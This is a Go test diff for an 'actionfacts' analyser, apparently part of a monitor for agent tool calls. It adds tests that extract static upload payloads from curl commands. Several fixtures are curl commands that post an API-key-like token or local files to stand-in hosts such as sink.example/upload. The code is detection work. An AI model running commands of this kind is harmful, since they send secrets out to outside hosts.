@@ -16,7 +16,79 @@
 
 package actionfacts
 
-import "testing"
+import (
+	"slices"
+	"testing"
+)
+
+func TestStaticCurlUploadPayloads(t *testing.T) {
+	t.Parallel()
+
+	const token = "sk-proj-A7b9C2d4E6f8G1h3J5k7L9m2"
+	for _, test := range []struct {
+		name        string
+		argv        []string
+		expandIndex int
+		want        []string
+	}{
+		{
+			name: "separate inline data", argv: []string{
+				"curl", "--data", token, "https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "joined inline data", argv: []string{
+				"curl", "-d" + token, "https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "file data source", argv: []string{
+				"curl", "--data", "@/tmp/" + token, "https://sink.example/upload",
+			},
+		},
+		{
+			name: "stdin data source", argv: []string{
+				"curl", "--data-binary", "@-", "https://sink.example/upload",
+			},
+		},
+		{
+			name: "control operand excluded", argv: []string{
+				"curl", "--cacert", "/tmp/" + token, "--data", "fixture",
+				"https://sink.example/upload",
+			},
+			want: []string{"fixture"},
+		},
+		{
+			name: "expanding data excluded", argv: []string{
+				"curl", "--data", token, "https://sink.example/upload",
+			},
+			expandIndex: 2,
+		},
+		{
+			name: "multiple transfer groups excluded", argv: []string{
+				"curl", "--data", "fixture", "https://one.example/upload",
+				"--next", "--data", token, "https://two.example/upload",
+			},
+		},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			facts := Analyze(Input{Tool: "exec", Argv: test.argv})
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			if test.expandIndex > 0 {
+				facts.Commands[0].Arguments[test.expandIndex].Expands = true
+			}
+			if got := StaticCurlUploadPayloads(facts.Commands[0]); !slices.Equal(got, test.want) {
+				t.Fatalf("payloads = %q, want %q", got, test.want)
+			}
+		})
+	}
+}
 
 func TestParsedWebTransferPipelinesAreAuthoritative(t *testing.T) {
 	t.Parallel()
